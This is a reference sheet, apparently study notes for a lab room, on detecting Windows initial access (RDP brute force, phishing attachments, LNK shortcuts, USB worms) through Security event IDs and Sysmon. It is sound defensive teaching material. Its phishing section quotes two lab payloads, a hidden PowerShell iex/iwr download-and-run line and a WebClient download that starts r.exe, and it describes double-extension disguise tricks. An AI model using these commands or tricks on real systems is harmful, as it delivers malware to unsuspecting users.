# 🛡️ Windows Threat Detection 1 — Initial Access — Reference Sheet

> **TL;DR:** This room covers common Windows **Initial Access** techniques and how to detect each with event logs alone. Initial Access splits into **exposed services** (RDP, public-facing apps) detected via Security logs (4624/4625), and **user-driven attacks** (phishing binaries/LNK, USB) best detected via **Sysmon** process/file/network events. Core skill: correlate by **Logon ID** (Security) and **ProcessId** (Sysmon) to reconstruct the attack chain from entry → execution → drop → C2.

---

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| RDP = "Ransomware Deployment Protocol" | Exposed RDP breaches so often lead directly to ransomware that defenders nicknamed it this. Over 5M RDP machines are internet-exposed. |
| Every RDP login = TWO 4624 events | A Type 10 (RemoteInteractive) event is paired with a Type 3 (Network) event. The **real Workstation Name/hostname is in the Type 3 event**, not the Type 10. |
| Windows hides known extensions by default | `invoice.pdf.exe` displays as `invoice.pdf`. Attackers exploit this with double extensions + fake icons. |
| `.com`, `.scr`, `.cpl` are executables too | Users distrust `.exe` but happily open `.com` files (e.g. `tryhatme.com` looks like a URL, runs as a binary). |
| LNK files leave little execution trace | Explorer reads the LNK "Target" field and makes it look like `explorer.exe` launched PowerShell directly — no LNK process appears. |
| Detect LNK phishing via preceding file-create | Since LNK execution is near-invisible, look for the LNK file appearing in Downloads (Sysmon ID 11) just before the PowerShell launch. |
| USB & phishing detection look identical | Both rely on a user launching a binary via `explorer.exe`, so the start of the chain is hard to pin down. |
| USB evidence = execution from external drive | Look for images running from `E:\`, `F:\`, etc. — USB drives usually get D:, E:, or F: letters. |
| USB worms self-propagate | Malware copies itself to OTHER connected drives, creating a Sysmon ID 11 for each copy (e.g. E: → F:). |
| QueryStatus 9003 = DNS failure (NXDOMAIN-ish) | In the room, `rjj.store` resolved with status 9003 and empty results — the domain still reveals the C2 intent even if resolution failed. |
| Identical IMPHASH across samples | `best-cat.jpg.exe` and the USB binary share IMPHASH `D42595B695FC008EF2C56AABD8EFD68E` — a pivot to find related malware. |

## 🚪 Task 2 — Intro to Initial Access

**Definition:** Initial Access = the moment a threat actor first gets through the "front door" into a system.

| Category | MITRE Technique | Description |
|---|---|---|
| Exposed Services | **T1133** / External Remote Services | Exposed RDP/VNC/SSH with weak passwords. |
| Exposed Services | **T1190** / Exploit Public-Facing Application | Misconfigured/vulnerable websites and apps. |
| User-Driven | **T1566** / Phishing | Trick users into launching malware themselves. |
| User-Driven | **T1091** / Removable Media | Infect USB devices and rely on user plug-in. |

Major ransomware groups (Medusa, Akira) have used all of these techniques.

## 🖥️ Task 3 — Initial Access via RDP

**Scenario:** IT admin exposed RDP with creds `Administrator:Summer2025`. Log file: `RDP-Security.evtx`.

### Attack Chain & Detection

| # | Attack Step | Detection |
|---|---|---|
| 1 | Network Scan (botnet finds open RDP) | N/A — out of room scope |
| 2 | RDP Brute Force (common usernames) | Filter **4625** → logon types **3 & 10** → external Source IPs |
| 3 | Initial Access via RDP (~100 attempts) | Switch filter to **4624** → check the account used |
| 4 | Further Malicious Actions (2 hrs later) | Filter **4624 type 10** → copy **Logon ID** → search Sysmon for same Logon ID → see all RDP-launched processes |

### Logon Type Reference (key for RDP)

| Type | Name | Typical scenario | SOC note |
|---|---|---|---|
| 2 | Interactive | Console logon (keyboard/mouse) | Physical presence |
| 3 | Network | SMB/share/printer access | Noisy; spikes from odd sources = lateral movement |
| 4 | Batch | Task Scheduler job | Unexpected accounts = persistence |
| 5 | Service | SCM starts a service account | New service name + type 5 + high priv = malware persistence |
| 10 | RemoteInteractive | RDP / Terminal Services / Remote Assistance | Monitor on DCs & critical servers — stolen-cred lateral movement |

> **Type 3 vs Type 10:** Type 3 = non-interactive network resource access; Type 10 = full remote desktop. With NLA on, an RDP session generates both — pull the hostname from the Type 3 event.

> **Service logon (Type 5) hunting tip:** Combine with **7045** (service installed) and **4688** (process creation) to catch suspicious service-based persistence.

## 🎣 Task 4 — Initial Access via Phishing

**Context:** Phishing increased **41×** since ChatGPT's 2022 release (HoxHunt 2025). Two techniques covered: malicious binaries and LNK attachments. Practice folders: `Phishing Case 1-3`.

### Binary Attachments

| Trick | Example |
|---|---|
| Uncommon executable extensions | `.com`, `.scr`, `.cpl` (e.g. `tryhatme.com`, `www.skype.com`) |
| Hidden known extensions (default Windows behavior) | `invoice.pdf.exe` shows as `invoice.pdf` |
| Double extension + fake icon (MITRE T1036.007) | `cat.png.com`, `best-cat.jpg.exe` |

### LNK Attachments

LNK shortcuts hide a payload in the **Target** field (verify via right-click → Properties → Shortcut tab). They can run any command with any icon. Example chain: **LNK → PowerShell → RemcosRAT**.

```powershell
# Full LNK payload (Phishing Case 2)
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -c iex (iwr -UseBasicParsing "http://wp16.hqywlqpa.thm:8000/cgi-bin/f").Content
# -WindowStyle hidden : no visible window
# iwr (Invoke-WebRequest) : download next-stage payload
# iex (Invoke-Expression) : execute the downloaded content in memory
```

```powershell
# RemcosRAT-style payload (room example)
(New-Object System.Net.WebClient).DownloadFile('https://breacheddomain.thm/FILTERED/r.exe','C:\ProgramData\r.exe')
start C:\ProgramData\r.exe
# Downloads r.exe to ProgramData, then executes it
```

## 🔍 Task 5 — Continuing Phishing (Sysmon detection)

### Sysmon Event Chain for Double-Extension Attachment

| # | Event ID | What it shows | Key fields |
|---|---|---|---|
| 1 | **1** | Web browser launched | Image=`msedge.exe`, ParentImage=`Explorer.EXE` |
| 2 | **11** | Archive appears in Downloads | Image=`msedge.exe`, TargetFilename=`...invoice.zip` |
| 3 | **11** | User unarchives file | Image=`Explorer.EXE` or `7zG.exe`, TargetFilename=`...invoice.pdf.exe` |
| 4 | **1** | User double-clicks unarchived file | Image=`...invoice.pdf.exe`, ParentImage=`Explorer.EXE` |

### LNK Detection Note

After launch, `explorer.exe` appears to launch PowerShell directly. Confirm it was LNK phishing by finding the **preceding ID 11 file-create** of the LNK in Downloads.

### Phishing Case 3 Investigation Flow (worked example)

```text
ID 11 (Downloads)  → top-cats.zip downloaded by msedge.exe (PID 1316)
ID 11 (EXE rule)   → best-cat.jpg.exe unarchived to C:\Users\Administrator\Pictures (by Explorer PID 2788)
ID 1  (Process)    → best-cat.jpg.exe executed as PID 5484 (parent 2788 = explorer.exe)
ID 22 (DNS Query)  → PID 5484 queried rjj.store (QueryStatus 9003)
```

## 💾 Task 6 — Initial Access via USB

**Why USB still matters:** bypasses firewalls, works without internet, spreads without user interaction. Real cases: Camaro Dragon, Raspberry Robin. Practice file: `USB-Sysmon.evtx`.

### Common USB Infection Tricks

| Trick | Detail |
|---|---|
| Hide real files + drop `RECOVERY.lnk` | User clicks the only visible item |
| `Photos.exe` with folder icon | Looks like a directory |
| Double-extension copies of all files | `photo_2024_1_12.jpg.exe` |

### USB Attack Chain (worked example)

```text
ID 1  → E:\Open Sandisk 4GB USB.exe executed (PID 1108, CurrentDirectory E:\)
ID 11 → dropped C:\Users\Public\Documents\winupdate.exe (persistence)
ID 11 → copied self to F:\Open Data Traveler 32 GB USB.exe (propagation)
```

> **Detection key:** an Image executing from `E:\`, `F:\` etc. is the USB evidence. The same binary writing to other drive letters (ID 11) = worm propagation.

## 🎯 Key Takeaways

| Takeaway | Detail |
|---|---|
| Two main Initial Access vectors | Exposed services & user-driven attacks. |
| RDP detection = authentication logs | 4624/4625 + Logon Type 3/10 + external IP. |
| User-driven detection = process events | Prefer Sysmon (ID 1 process, 11 file, 22 DNS). |
| Each method has unique fingerprints | LNK = no process trace; USB = execution from external drive + self-copy. |
| Always correlate | Logon ID (Security) and ProcessId (Sysmon) tie the chain together. |
